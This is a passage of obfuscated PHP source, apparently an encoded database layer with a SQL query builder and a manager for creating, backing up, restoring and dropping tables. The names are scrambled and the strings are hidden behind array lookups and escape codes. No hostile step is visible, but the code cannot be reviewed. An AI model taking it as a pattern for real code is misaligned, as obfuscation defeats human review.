$İÌïû‘¨ = $é¢•‘ú›[$øğ€ÛÄı][0]; } $„ĞúÔŠŒ .= $šÀñìäÎ[312] . $á‘¸Š‰ñ . $šÀñìäÎ[63] . $İÌïû‘¨ . $šÀñìäÎ[63] . $this->parseValue($ìÄ°Õ®®) . $šÀñìäÎ[1079] . $€»©™’… . $šÀñìäÎ[63]; } } $„ĞúÔŠŒ = substr($„ĞúÔŠŒ, 0, -4); } } else { $„ĞúÔŠŒ .= $á‘¸Š‰ñ . $šÀñìäÎ[1083] . $this->parseValue($é¢•‘ú›); } return $„ĞúÔŠŒ; } protected function parseThinkWhere($©“üÈªƒ, $»©»Ğ±ğ) { $ÕÆ‹ÚŸè =& $_SERVER[ˆûùúÊ¯]; $Ç÷“ñ¢ˆ = $ÕÆ‹ÚŸè[12]; switch ($©“üÈªƒ) { case $ÕÆ‹ÚŸè[404]: $Ç÷“ñ¢ˆ = $»©»Ğ±ğ; break; case $ÕÆ‹ÚŸè[1066]: $Ç÷“ñ¢ˆ = is_string($»©»Ğ±ğ) ? $»©»Ğ±ğ : substr($this->parseWhere($»©»Ğ±ğ), 6); break; case $ÕÆ‹ÚŸè[1084]: parse_str($»©»Ğ±ğ, $ˆÆœå‚); if (isset($ˆÆœå‚[$ÕÆ‹ÚŸè[1061]])) { $”„Şµˆ = $ÕÆ‹ÚŸè[63] . strtoupper($ˆÆœå‚[$ÕÆ‹ÚŸè[1061]]) . $ÕÆ‹ÚŸè[63]; unset($ˆÆœå‚[$ÕÆ‹ÚŸè[1061]]); } else { $”„Şµˆ = $ÕÆ‹ÚŸè[1065]; } $êäÂĞ«¼ = array(); foreach ($ˆÆœå‚ as $Â˜§¼‡¢ => $ÀÔÚË•) { $êäÂĞ«¼[] = $this->parseKey($Â˜§¼‡¢) . $ÕÆ‹ÚŸè[1083] . $this->parseValue($ÀÔÚË•); } $Ç÷“ñ¢ˆ = implode($”„Şµˆ, $êäÂĞ«¼); break; } return $Ç÷“ñ¢ˆ; } protected function parseLimit($Íîâ±½) { $Á¼‘û·á =& $_SERVER[ˆûùúÊ¯]; return !empty($Íîâ±½) ? $Á¼‘û·á[61] . $Íîâ±½ . $Á¼‘û·á[63] : $Á¼‘û·á[12]; } protected function parseJoin($¥œ±šğÕ) { $õĞ¦ª–° =& $_SERVER[ˆûùúÊ¯]; $…ÑõÅ½ª = $õĞ¦ª–°[12]; if (!empty($¥œ±šğÕ)) { if (is_array($¥œ±šğÕ)) { foreach ($¥œ±šğÕ as $ÏÖæñÂ¯ => $Ôã¢¬ş£) { if (!1 !== stripos($Ôã¢¬ş£, $õĞ¦ª–°[1085])) { $…ÑõÅ½ª .= $õĞ¦ª–°[63] . $Ôã¢¬ş£; } else { $…ÑõÅ½ª .= $õĞ¦ª–°[1086] . $Ôã¢¬ş£; } } } else { $…ÑõÅ½ª .= $õĞ¦ª–°[1086] . $¥œ±šğÕ; } } $…ÑõÅ½ª = preg_replace($õĞ¦ª–°[1087], think_config($õĞ¦ª–°[991]) . $õĞ¦ª–°[1088], $…ÑõÅ½ª); return $…ÑõÅ½ª; } protected function parseOrder($£àÏø×™) { $ÊËŒé¢È =& $_SERVER[ˆûùúÊ¯]; if (is_array($£àÏø×™)) { $õ†Öƒ¸ = array(); foreach ($£àÏø×™ as $Áİ£Æü½ => $¶Ô¶ñĞ) { if (is_numeric($Áİ£Æü½)) { $õ†Öƒ¸[] = $this->parseKey($¶Ô¶ñĞ); } else { $¶Ô¶ñĞ = in_array(strtoupper(trim($¶Ô¶ñĞ)), array($ÊËŒé¢È[1089], $ÊËŒé¢È[1090])) ? $ÊËŒé¢È[63] . $¶Ô¶ñĞ : $ÊËŒé¢È[12]; if (preg_match($ÊËŒé¢È[1091], $Áİ£Æü½)) { $õ†Öƒ¸[] = $this->parseKey($Áİ£Æü½) . $¶Ô¶ñĞ; } else { think_exception($ÊËŒé¢È[1092] . $Áİ£Æü½); } } } $£àÏø×™ = implode($ÊËŒé¢È[60], $õ†Öƒ¸); } return !empty($£àÏø×™) ? $ÊËŒé¢È[1093] . $£àÏø×™ : $ÊËŒé¢È[12]; } protected function parseGroup($‰¥ÏÊû) { $Æ¶Ö±Ÿ =& $_SERVER[ˆûùúÊ¯]; return !empty($‰¥ÏÊû) ? $Æ¶Ö±Ÿ[1094] . $‰¥ÏÊû : $Æ¶Ö±Ÿ[12]; } protected function parseHaving($ôñ¤ÌÚ) { $ÈÅ÷®µö =& $_SERVER[ˆûùúÊ¯]; return !empty($ôñ¤ÌÚ) ? $ÈÅ÷®µö[1095] . $ôñ¤ÌÚ : $ÈÅ÷®µö[12]; } protected function parseComment($úŞ¾Â†è) { $‰ğŸºƒ =& $_SERVER[ˆûùúÊ¯]; return !empty($úŞ¾Â†è) ? $‰ğŸºƒ[1096] . $úŞ¾Â†è . $‰ğŸºƒ[1097] : $‰ğŸºƒ[12]; } protected function parseDistinct($É€ÓüÛ) { $ÕÕ·õ»ª =& $_SERVER[ˆûùúÊ¯]; return !empty($É€ÓüÛ) ? $ÕÕ·õ»ª[1098] : $ÕÕ·õ»ª[12]; } protected function parseUnion($ş¢´Í‘Ñ) { $­¦êÊ =& $_SERVER[ˆûùúÊ¯]; if (empty($ş¢´Í‘Ñ)) { return $­¦êÊ[12]; } if (isset($ş¢´Í‘Ñ[$­¦êÊ[400]])) { $æŒ¯ş¿ = $­¦êÊ[1099]; unset($ş¢´Í‘Ñ[$­¦êÊ[400]]); } else { $æŒ¯ş¿ = $­¦êÊ[1100]; } foreach ($ş¢´Í‘Ñ as $ª¦  „ø) { $¾è²„ƒ[] = $æŒ¯ş¿ . (is_array($ª¦  „ø) ? $this->buildSelectSql($ª¦  „ø) : $ª¦  „ø); } return implode($­¦êÊ[63], $¾è²„ƒ); } public function insert($£ãŞ‡°à, $Ö¦ÆÉç = array(), $äÚîòğ = false) { $¹İÏë“ =& $_SERVER[ˆûùúÊ¯]; $Ì†æœÀÅ = $öî®ƒ—Ş = array(); $this->model = $Ö¦ÆÉç[$¹İÏë“[333]]; foreach ($£ãŞ‡°à as $Íß±ï² => $èÊ„‘ö) { if (is_array($èÊ„‘ö) && $¹İÏë“[349] == $èÊ„‘ö[0]) { $öî®ƒ—Ş[] = $this->parseKey($Íß±ï²); $Ì†æœÀÅ[] = $èÊ„‘ö[1]; } elseif (is_scalar($èÊ„‘ö) || is_null($èÊ„‘ö)) { $öî®ƒ—Ş[] = $this->parseKey($Íß±ï²); $Ì†æœÀÅ[] = $this->parseValue($èÊ„‘ö); } } $–«›ô´ = ($äÚîòğ ? $¹İÏë“[968] : $¹İÏë“[969]) . $¹İÏë“[970] . $this->parseTable($Ö¦ÆÉç[$¹İÏë“[331]]) . $¹İÏë“[964] . implode($¹İÏë“[60], $öî®ƒ—Ş) . $¹İÏë“[965] . implode($¹İÏë“[60], $Ì†æœÀÅ) . $¹İÏë“[966]; $–«›ô´ .= $this->parseLock(isset($Ö¦ÆÉç[$¹İÏë“[904]]) ? $Ö¦ÆÉç[$¹İÏë“[904]] : !1); $–«›ô´ .= $this->parseComment(!empty($Ö¦ÆÉç[$¹İÏë“[406]]) ? $Ö¦ÆÉç[$¹İÏë“[406]] : $¹İÏë“[12]); return $this->execute($–«›ô´, $this->parseBind(!empty($Ö¦ÆÉç[$¹İÏë“[337]]) ? $Ö¦ÆÉç[$¹İÏë“[337]] : array())); } public function selectInsert($’ã’„ßÎ, $ô¦êÄõ, $€äÖ˜­Ë = array()) { $¾‚£¥é™ =& $_SERVER[ˆûùúÊ¯]; $this->model = $€äÖ˜­Ë[$¾‚£¥é™[333]]; if (is_string($’ã’„ßÎ)) { $’ã’„ßÎ = explode($¾‚£¥é™[60], $’ã’„ßÎ); } array_walk($’ã’„ßÎ, array($this, $¾‚£¥é™[967])); $£†‡Ô—¯ = $¾‚£¥é™[1101] . $this->parseTable($ô¦êÄõ) . $¾‚£¥é™[964] . implode($¾‚£¥é™[60], $’ã’„ßÎ) . $¾‚£¥é™[1079]; $£†‡Ô—¯ .= $this->buildSelectSql($€äÖ˜­Ë); return $this->execute($£†‡Ô—¯, $this->parseBind(!empty($€äÖ˜­Ë[$¾‚£¥é™[337]]) ? $€äÖ˜­Ë[$¾‚£¥é™[337]] : array())); } public function update($½µÖ™æû, $Û»÷ÂÄ) { $Íª€ÎÑ— =& $_SERVER[ˆûùúÊ¯]; $this->model = $Û»÷ÂÄ[$Íª€ÎÑ—[333]]; $Ä¾õ®³â = $Íª€ÎÑ—[1102] . $this->parseTable($Û»÷ÂÄ[$Íª€ÎÑ—[331]]) . $this->parseSet($½µÖ™æû) . $this->parseWhere(!empty($Û»÷ÂÄ[$Íª€ÎÑ—[327]]) ? $Û»÷ÂÄ[$Íª€ÎÑ—[327]] : $Íª€ÎÑ—[12]) . $this->parseOrder(!empty($Û»÷ÂÄ[$Íª€ÎÑ—[417]]) ? $Û»÷ÂÄ[$Íª€ÎÑ—[417]] : $Íª€ÎÑ—[12]) . $this->parseLimit(!empty($Û»÷ÂÄ[$Íª€ÎÑ—[344]]) ? $Û»÷ÂÄ[$Íª€ÎÑ—[344]] : $Íª€ÎÑ—[12]) . $this->parseLock(isset($Û»÷ÂÄ[$Íª€ÎÑ—[904]]) ? $Û»÷ÂÄ[$Íª€ÎÑ—[904]] : !1) . $this->parseComment(!empty($Û»÷ÂÄ[$Íª€ÎÑ—[406]]) ? $Û»÷ÂÄ[$Íª€ÎÑ—[406]] : $Íª€ÎÑ—[12]); return $this->execute($Ä¾õ®³â, $this->parseBind(!empty($Û»÷ÂÄ[$Íª€ÎÑ—[337]]) ? $Û»÷ÂÄ[$Íª€ÎÑ—[337]] : array())); } public function delete($Çö²ö† = array()) { $Óá¾îğ÷ =& $_SERVER[ˆûùúÊ¯]; $this->model = $Çö²ö†[$Óá¾îğ÷[333]]; $˜ˆ‚ıÁ = $Óá¾îğ÷[1103] . $this->parseTable($Çö²ö†[$Óá¾îğ÷[331]]) . $this->parseWhere(!empty($Çö²ö†[$Óá¾îğ÷[327]]) ? $Çö²ö†[$Óá¾îğ÷[327]] : $Óá¾îğ÷[12]) . $this->parseOrder(!empty($Çö²ö†[$Óá¾îğ÷[417]]) ? $Çö²ö†[$Óá¾îğ÷[417]] : $Óá¾îğ÷[12]) . $this->parseLimit(!empty($Çö²ö†[$Óá¾îğ÷[344]]) ? $Çö²ö†[$Óá¾îğ÷[344]] : $Óá¾îğ÷[12]) . $this->parseLock(isset($Çö²ö†[$Óá¾îğ÷[904]]) ? $Çö²ö†[$Óá¾îğ÷[904]] : !1) . $this->parseComment(!empty($Çö²ö†[$Óá¾îğ÷[406]]) ? $Çö²ö†[$Óá¾îğ÷[406]] : $Óá¾îğ÷[12]); return $this->execute($˜ˆ‚ıÁ, $this->parseBind(!empty($Çö²ö†[$Óá¾îğ÷[337]]) ? $Çö²ö†[$Óá¾îğ÷[337]] : array())); } public function select($Ö–ë›Õò = array()) { $æú€¥¢Œ =& $_SERVER[ˆûùúÊ¯]; $this->model = $Ö–ë›Õò[$æú€¥¢Œ[333]]; $ì×Éó± = $this->buildSelectSql($Ö–ë›Õò); $ıµ±ãÂá = isset($Ö–ë›Õò[$æú€¥¢Œ[401]]) ? $Ö–ë›Õò[$æú€¥¢Œ[401]] : !1; if ($ıµ±ãÂá) { $—ãè¦³ú = is_string($ıµ±ãÂá[$æú€¥¢Œ[104]]) ? $ıµ±ãÂá[$æú€¥¢Œ[104]] : $æú€¥¢Œ[1104] . md5($ì×Éó±); $ü«‚·Âé = think_cache($—ãè¦³ú, $æú€¥¢Œ[12], $ıµ±ãÂá); if (!1 !== $ü«‚·Âé) { return $ü«‚·Âé; } } $âì°§½¯ = $this->query($ì×Éó±, $this->parseBind(!empty($Ö–ë›Õò[$æú€¥¢Œ[337]]) ? $Ö–ë›Õò[$æú€¥¢Œ[337]] : array())); if ($ıµ±ãÂá && !1 !== $âì°§½¯) { think_cache($—ãè¦³ú, $âì°§½¯, $ıµ±ãÂá); } return $âì°§½¯; } public function buildSelectSql($ŒÇêÄ´ = array()) { $Ù©ÀÔÂ  =& $_SERVER[ˆûùúÊ¯]; if (isset($ŒÇêÄ´[$Ù©ÀÔÂ [405]])) { if (strpos($ŒÇêÄ´[$Ù©ÀÔÂ [405]], $Ù©ÀÔÂ [60])) { list($ÂÓÆÍÄ, $ˆãßÁ¯°) = explode($Ù©ÀÔÂ [60], $ŒÇêÄ´[$Ù©ÀÔÂ [405]]); } else { $ÂÓÆÍÄ = $ŒÇêÄ´[$Ù©ÀÔÂ [405]]; } $ÂÓÆÍÄ = $ÂÓÆÍÄ ? $ÂÓÆÍÄ : 1; $ˆãßÁ¯° = isset($ˆãßÁ¯°) ? $ˆãßÁ¯° : (is_numeric($ŒÇêÄ´[$Ù©ÀÔÂ [344]]) ? $ŒÇêÄ´[$Ù©ÀÔÂ [344]] : 20); $ßà—„×¡ = $ˆãßÁ¯° * ((int) $ÂÓÆÍÄ - 1); $ŒÇêÄ´[$Ù©ÀÔÂ [344]] = $ßà—„×¡ . $Ù©ÀÔÂ [60] . $ˆãßÁ¯°; } if (think_config($Ù©ÀÔÂ [1105])) { $İÂ¥û = $Ù©ÀÔÂ [1106] . md5(serialize($ŒÇêÄ´)); $îÄ„ÌÀ  = think_cache($İÂ¥û); if ($îÄ„ÌÀ ) { return $îÄ„ÌÀ ; } } $ÅâÛí° = $this->parseSql($this->selectSql, $ŒÇêÄ´); $ÅâÛí° .= $this->parseLock(isset($ŒÇêÄ´[$Ù©ÀÔÂ [904]]) ? $ŒÇêÄ´[$Ù©ÀÔÂ [904]] : !1); if (isset($İÂ¥û)) { think_cache($İÂ¥û, $ÅâÛí°); } return $ÅâÛí°; } public function parseSql($±ãğÒ»Ñ, $ÚÔşçÖÒ = array()) { $œÒ‘ûæı =& $_SERVER[ˆûùúÊ¯]; $±ãğÒ»Ñ = str_replace(array($œÒ‘ûæı[1107], $œÒ‘ûæı[1108], $œÒ‘ûæı[1109], $œÒ‘ûæı[1110], $œÒ‘ûæı[1111], $œÒ‘ûæı[1112], $œÒ‘ûæı[1113], $œÒ‘ûæı[1114], $œÒ‘ûæı[1115], $œÒ‘ûæı[1116], $œÒ‘ûæı[1117]), array($this->parseTable("{$ÚÔşçÖÒ[$œÒ‘ûæı[331]]}"), $this->parseDistinct(isset($ÚÔşçÖÒ[$œÒ‘ûæı[1118]]) ? $ÚÔşçÖÒ[$œÒ‘ûæı[1118]] : !1), $this->parseField(!empty($ÚÔşçÖÒ[$œÒ‘ûæı[325]]) ? $ÚÔşçÖÒ[$œÒ‘ûæı[325]] : $œÒ‘ûæı[212]), $this->parseJoin(!empty($ÚÔşçÖÒ[$œÒ‘ûæı[334]]) ? $ÚÔşçÖÒ[$œÒ‘ûæı[334]] : $œÒ‘ûæı[12]), $this->parseWhere(!empty($ÚÔşçÖÒ[$œÒ‘ûæı[327]]) ? $ÚÔşçÖÒ[$œÒ‘ûæı[327]] : $œÒ‘ûæı[12]), $this->parseGroup(!empty($ÚÔşçÖÒ[$œÒ‘ûæı[555]]) ? $ÚÔşçÖÒ[$œÒ‘ûæı[555]] : $œÒ‘ûæı[12]), $this->parseHaving(!empty($ÚÔşçÖÒ[$œÒ‘ûæı[1119]]) ? $ÚÔşçÖÒ[$œÒ‘ûæı[1119]] : $œÒ‘ûæı[12]), $this->parseOrder(!empty($ÚÔşçÖÒ[$œÒ‘ûæı[417]]) ? $ÚÔşçÖÒ[$œÒ‘ûæı[417]] : $œÒ‘ûæı[12]), $this->parseLimit(!empty($ÚÔşçÖÒ[$œÒ‘ûæı[344]]) ? $ÚÔşçÖÒ[$œÒ‘ûæı[344]] : $œÒ‘ûæı[12]), $this->parseUnion(!empty($ÚÔşçÖÒ[$œÒ‘ûæı[399]]) ? $ÚÔşçÖÒ[$œÒ‘ûæı[399]] : $œÒ‘ûæı[12]), $this->parseComment(!empty($ÚÔşçÖÒ[$œÒ‘ûæı[406]]) ? $ÚÔşçÖÒ[$œÒ‘ûæı[406]] : $œÒ‘ûæı[12])), $±ãğÒ»Ñ); return $±ãğÒ»Ñ; } public function getLastSql($¼ò”üÀ· = '') { return $¼ò”üÀ· ? $this->modelSql[$¼ò”üÀ·] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($‰ßóÜ­Ë) { return addslashes($‰ßóÜ­Ë); } public function setModel($‡˜ÕÄàğ) { $this->model = $‡˜ÕÄàğ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($„í›‰œœ = array()) { $¦„Ù·ğº =& $_SERVER[ˆûùúÊ¯]; if (empty($„í›‰œœ)) { $„í›‰œœ = $GLOBALS[$¦„Ù·ğº[6]][$¦„Ù·ğº[31]]; } $this->database = $„í›‰œœ; } public function model($ÖòûºĞ = '') { return new ModelBase($ÖòûºĞ, $_SERVER[ˆûùúÊ¯][12], $this->database); } public function db($ø¾Ìş = false) { $µººÛŒ =& $_SERVER[ˆûùúÊ¯]; $§é¢¹ = array_change_key_case($this->database); if ($this->dbType() == $µººÛŒ[23] || !$ø¾Ìş) { return $this->model()->db(); } $à³æôËò = $§é¢¹[$µººÛŒ[1033]]; $§é¢¹[$µººÛŒ[1033]] = $µººÛŒ[12]; if ($§é¢¹[$µººÛŒ[1028]] == $µººÛŒ[1025]) { $İ©¤òÅ° = $§é¢¹[$µººÛŒ[1034]]; $§é¢¹[$µººÛŒ[1034]] = substr($İ©¤òÅ°, 0, strrpos($İ©¤òÅ°, $µººÛŒ[1120])); } $this->database = $§é¢¹; $¢Ô†éç = $this->model()->db(); try { $•Œ–Û®ê = $¢Ô†éç->execute("\163\x68\x6f\167\40\x64\141\x74\141\142\x61\x73\145\x73\40\154\x69\153\145\x20\x27{$à³æôËò}\x27"); } catch (Exception $êª½³ºª) { } if (!$•Œ–Û®ê) { $¢Ô†éç->execute("\x63\x72\145\x61\x74\x65\40\x64\x61\164\x61\x62\x61\x73\x65\40\x60{$à³æôËò}\140"); } $§é¢¹[$µººÛŒ[1033]] = $à³æôËò; if ($§é¢¹[$µººÛŒ[1028]] == $µººÛŒ[1025]) { $§é¢¹[$µººÛŒ[1034]] .= $µººÛŒ[1120] . $à³æôËò; } $this->database = $§é¢¹; $¢Ô†éç->execute("\165\163\x65\x20\140{$à³æôËò}\x60"); return $¢Ô†éç; } public function createTable($Ñ ¯‡”ò, &$êÜÑâ·­) { $àæ‚‰õ¼ =& $_SERVER[ˆûùúÊ¯]; if (!IO::exist($Ñ ¯‡”ò)) { ActionCall($àæ‚‰õ¼[1121], !0, 0); show_json(LNG($àæ‚‰õ¼[1122]), !1); } $×Èï÷¡ = $this->model()->db(); $áÇ˜áÂ = sqlSplit(IO::getContent($Ñ ¯‡”ò)); foreach ($áÇ˜áÂ as $š¬Øä ¨) { $´í¾ëÄ = stripos($š¬Øä ¨, $àæ‚‰õ¼[1123]) === 0; if ($´í¾ëÄ) { $êÜÑâ·­->task[$àæ‚‰õ¼[846]] += 1; } $×Èï÷¡->execute($š¬Øä ¨); if ($´í¾ëÄ) { preg_match($àæ‚‰õ¼[1124], $š¬Øä ¨, $Ç®˜š½¤); $êÜÑâ·­->task[$àæ‚‰õ¼[1125]] = $Ç®˜š½¤[1]; $êÜÑâ·­->update(1); } } } public function insertTable($òªÍë›Ğ, &$Ø¨ıñ…) { $ïƒ”ƒä =& $_SERVER[ˆûùúÊ¯]; $½¼Û¦ÎÜ = $this->model()->db(); $ˆñßÓ£Ä = $ĞÈ¦–© ? array($ĞÈ¦–©) : $½¼Û¦ÎÜ->getTables(); foreach ($òªÍë›Ğ as $ €§Ñ÷Å) { $ĞÈ¦–© = basename($ €§Ñ÷Å, $ïƒ”ƒä[848]); if (!in_array($ĞÈ¦–©, $ˆñßÓ£Ä)) { continue; } $Ø¨ıñ…->task[$ïƒ”ƒä[1125]] = $ĞÈ¦–©; if (get_filesize($ €§Ñ÷Å) == 0) { continue; } $ê¯öÂ†¡ = $this->sqlToDb($ €§Ñ÷Å, $Ø¨ıñ…); if (!$ê¯öÂ†¡) { ActionCall($ïƒ”ƒä[1121], !0, 0); show_json(LNG($ïƒ”ƒä[1126]) . "\133{$ĞÈ¦–©}\135", !1); } } } public function sqlFromDb($áè„şÈî, $üÑĞï´Ù, &$„óÄ¤¶ã, $Åş£ÔÇ‘ = '') { if ($„óÄ¤¶ã) { $„óÄ¤¶ã->task[$_SERVER[ˆûùúÊ¯][1125]] = $áè„şÈî; } $ÀÓêôŠÜ = $this->model($áè„şÈî); $úë‡¯ó‡ = 0; $êÈ“üî™ = 0; $½£Ü÷Ÿ = 10000; $¡¨ƒ‹ü¹ = fopen($üÑĞï´Ù, $_SERVER[ˆûùúÊ¯][1127]); $Åë°Òù¡ = $ÀÓêôŠÜ->getPk(); $Ğ¨ùçÄÈ = $ÀÓêôŠÜ->getDbFields(); $ÑÆàÚ²™ = $_SERVER[ˆûùúÊ¯][12]; if ($GLOBALS[$_SERVER[ˆûùúÊ¯][847]] && in_array($áè„şÈî, array($_SERVER[ˆûùúÊ¯][1128], $_SERVER[ˆûùúÊ¯][1129]))) { $ÑÆàÚ²™ = $áè„şÈî; } do { $•ŸÇÛØÙ = array($Åë°Òù¡ => array($_SERVER[ˆûùúÊ¯][1075], $êÈ“üî™)); $ººçïº = $ÀÓêôŠÜ->where($•ŸÇÛØÙ)->field($Ğ¨ùçÄÈ)->order($Åë°Òù¡ . $_SERVER[ˆûùúÊ¯][1130])->limit($½£Ü÷Ÿ)->select(); $ººçïº = !empty($ººçïº) ? $ººçïº : array(); if (!($èÖ­¿ è = count($ººçïº))) { break; } $ğîÔ…‡ = end($ººçïº); $êÈ“üî™ = $ğîÔ…‡[$Åë°Òù¡]; $ëşç¥å¯ = array(); foreach ($ººçïº as $°ÅÜŒõî) { if ($ÑÆàÚ²™) { if ($áè„şÈî == $_SERVER[ˆûùúÊ¯][1128]) { if ($°ÅÜŒõî[$_SERVER[ˆûùúÊ¯][43]] == $_SERVER[ˆûùúÊ¯][1131]) { $ï´¼Û•« = json_decode($°ÅÜŒõî[$_SERVER[ˆûùúÊ¯][426]], !0); if ($ï´¼Û•«[$_SERVER[ˆûùúÊ¯][42]] == $GLOBALS[$_SERVER[ˆûùúÊ¯][847]] && $ï´¼Û•«[$_SERVER[ˆûùúÊ¯][810]] != 1) { continue; } } } else { if ($°ÅÜŒõî[$_SERVER[ˆûùúÊ¯][43]] == $_SERVER[ˆûùúÊ¯][1132] && $°ÅÜŒõî[$_SERVER[ˆûùúÊ¯][104]] == $_SERVER[ˆûùúÊ¯][839]) { continue; } } } if ($Åş£ÔÇ‘) { $°ÅÜŒõî[$_SERVER[ˆûùúÊ¯][94]] = "\x7b\x69\157\x3a{$Åş£ÔÇ‘}\x7d" . substr($°ÅÜŒõî[$_SERVER[ˆûùúÊ¯][94]], strlen("\173\151\x6f\x3a{$°ÅÜŒõî[$_SERVER[ˆûùúÊ¯][877]]}\175")); $°ÅÜŒõî[$_SERVER[ˆûùúÊ¯][877]] = $Åş£ÔÇ‘; } $ëşç¥å¯[] = $_SERVER[ˆûùúÊ¯][1133] . $this->sqlEncode($°ÅÜŒõî) . $_SERVER[ˆûùúÊ¯][1134]; } $ªŒïÑê¤ = "\111\116\123\x45\122\124\x20\111\x4e\124\117\40\x60{$áè„şÈî}\140\x20\x28\140" . implode($_SERVER[ˆûùúÊ¯][1135], $Ğ¨ùçÄÈ) . $_SERVER[ˆûùúÊ¯][1136]; fwrite($¡¨ƒ‹ü¹, $ªŒïÑê¤ . implode($_SERVER[ˆûùúÊ¯][1137], $ëşç¥å¯) . $_SERVER[ˆûùúÊ¯][81] . PHP_EOL); $úë‡¯ó‡ += $èÖ­¿ è; if ($„óÄ¤¶ã) { $„óÄ¤¶ã->update($èÖ­¿ è); } } while ($½£Ü÷Ÿ == $èÖ­¿ è); fclose($¡¨ƒ‹ü¹); return $úë‡¯ó‡; } public function sqlToDb($“Ôñ«², &$¤Ó©ãÙ) { $ÚĞÍŸöğ =& $_SERVER[ˆûùúÊ¯]; $×Ã€ù¾á = $this->model()->db(); $•ĞÀ™ú = @fopen($“Ôñ«², $ÚĞÍŸöğ[1138]); if (!$•ĞÀ™ú) { return !1; } $…Â˜ˆ”à = 0; $’û©‚õÓ = $ÚĞÍŸöğ[12]; $Ö˜ˆ¬÷ = array(); $Œàö‰²À = $this->dbType(); $èúŒŒ¾ª = $Œàö‰²À == $ÚĞÍŸöğ[23] ? 500 : 2000; $»‹Õé‡¨ = basename($“Ôñ«², $ÚĞÍŸöğ[848]); $µä±ŠÜË = 0; $àİè¸¢’ = 4194304 - 104858; $«ï¾¹ÏÍ = 1000000 - 104858; while (!feof($•ĞÀ™ú)) { $˜ŞØÑ¶Í = trim(fgets($•ĞÀ™ú)); if (!$˜ŞØÑ¶Í) { continue; } $íá©Ê„ˆ = $this->sqlDecode($˜ŞØÑ¶Í, $Œàö‰²À, $»‹Õé‡¨); if (stripos($íá©Ê„ˆ, $ÚĞÍŸöğ[407]) === 0) { if (!$’û©‚õÓ) { $’û©‚õÓ = $íá©Ê„ˆ . $ÚĞÍŸöğ[63]; } continue; } if ($¤Ó©ãÙ) { $¤Ó©ãÙ->task[$ÚĞÍŸöğ[846]] += 1; } $…Â˜ˆ”à++; $Ö˜ˆ¬÷[] = rtrim(rtrim(trim($íá©Ê„ˆ), $ÚĞÍŸöğ[60]), $ÚĞÍŸöğ[81]); $²êÒÅºŞ = null; $‡ÄÑ»› = strlen($íá©Ê„ˆ); $µä±ŠÜË += $‡ÄÑ»›; if ($µä±ŠÜË >= ($èúŒŒ¾ª == 500 ? $«ï¾¹ÏÍ : $àİè¸¢’)) { $²êÒÅºŞ = array_pop($Ö˜ˆ¬÷); if ($…Â˜ˆ”à > 1) { $…Â˜ˆ”à--; } } if ($…Â˜ˆ”à >= $èúŒŒ¾ª || $²êÒÅºŞ) { $íá©Ê„ˆ = $’û©‚õÓ . implode($ÚĞÍŸöğ[60], $Ö˜ˆ¬÷); if (!$×Ã€ù¾á->execute($íá©Ê„ˆ)) { return !1; } if ($¤Ó©ãÙ) { $¤Ó©ãÙ->update($…Â˜ˆ”à); } $Ö˜ˆ¬÷ = array(); $…Â˜ˆ”à = 0; $µä±ŠÜË = 0; if ($²êÒÅºŞ) { $Ö˜ˆ¬÷ = array($²êÒÅºŞ); $…Â˜ˆ”à = 1; $µä±ŠÜË = $‡ÄÑ»›; } } } fclose($•ĞÀ™ú); if (!empty($Ö˜ˆ¬÷)) { $íá©Ê„ˆ = $’û©‚õÓ . implode($ÚĞÍŸöğ[60], $Ö˜ˆ¬÷); if (!$×Ã€ù¾á->execute($íá©Ê„ˆ)) { return !1; } if ($¤Ó©ãÙ) { $¤Ó©ãÙ->update($…Â˜ˆ”à); } } return !0; } public function dropTable($ÔïÌâËÓ = null) { $Œ©ş”Õğ = $this->model()->db(); $á˜à‚¸¼ = $ÔïÌâËÓ ? array($ÔïÌâËÓ) : $Œ©ş”Õğ->getTables(); if (!$á˜à‚¸¼) { return; } foreach ($á˜à‚¸¼ as $ÔïÌâËÓ) { if ($ÔïÌâËÓ) { $ÔïÌâËÓ = strtolower($ÔïÌâËÓ); } else { continue; } $Œ©ş”Õğ->execute("\x64\162\157\x70\x20\164\141\x62\x6c\x65\x20\x69\146\x20\x65\x78\x69\163\x74\x73\x20\140{$ÔïÌâËÓ}\x60"); } } private function sqlEncode($ö™áñ) { $”²¸Ò =& $_SERVER[ˆûùúÊ¯]; $„¿’×Ü“ = array(); foreach ($ö™áñ as $ì×Ò¢ï¾) { if (is_array($ì×Ò¢ï¾)) { $ì×Ò¢ï¾ = json_encode_force($ì×Ò¢ï¾); } $ì×Ò¢ï¾ = addslashes($ì×Ò¢ï¾); $ì×Ò¢ï¾ = str_replace(array($”²¸Ò[1139], $”²¸Ò[18]), array($”²¸Ò[1140], $”²¸Ò[1141]), $ì×Ò¢ï¾); $„¿’×Ü“[] = str_replace($”²¸Ò[68], $”²¸Ò[1142], $ì×Ò¢ï¾); } return $”²¸Ò[68] . implode($”²¸Ò[1143], $„¿’×Ü“) . $”²¸Ò[68]; } private function sqlDecode($¤ÆÍ‡°, $ø§§ì§, $×ÛõÙŒõ = '') { $Æ§éÀÑ£ =& $_SERVER[ˆûùúÊ¯]; $¤ÆÍ‡° = str_replace(array($Æ§éÀÑ£[1140], $Æ§éÀÑ£[1141]), array($Æ§éÀÑ£[1139], $Æ§éÀÑ£[18]), $¤ÆÍ‡°); if ($ø§§ì§ == $Æ§éÀÑ£[23]) { return $×ÛõÙŒõ != $Æ§éÀÑ£[1144] ? stripslashes($¤ÆÍ‡°) : $¤ÆÍ‡°; } if ($×ÛõÙŒõ == $Æ§éÀÑ£[1144]) { $¤ÆÍ‡° = str_replace($Æ§éÀÑ£[1145], $Æ§éÀÑ£[128], stripslashes($¤ÆÍ‡°)); } return $¤ÆÍ‡°; } public function getSqlFile($ÙÅÛàİø = '') { $¤‹“Œ…’ =& $_SERVER[ˆûùúÊ¯]; $³¢ìÎ½ğ = $this->dbType(!0); $ÑÖ²¢¤ê = CONTROLLER_DIR . "\151\x6e\163\x74\141\x6c\x6c\x2f\x64\x61\164\x61\57{$³¢ìÎ½ğ}\56\163\161\154"; $Ïåò™¸Î = file_get_contents($ÑÖ²¢¤ê); $«óß’ãØ = $¤‹“Œ…’[1146] . ($³¢ìÎ½ğ == $¤‹“Œ…’[864] ? $¤‹“Œ…’[1147] : $¤‹“Œ…’[1148]) . $¤‹“Œ…’[1149]; preg_match_all($«óß’ãØ, $Ïåò™¸Î, $ªƒñí¯); $ô¨Ùã®® = $ªƒñí¯[1]; $âŞ—±ºÅ = 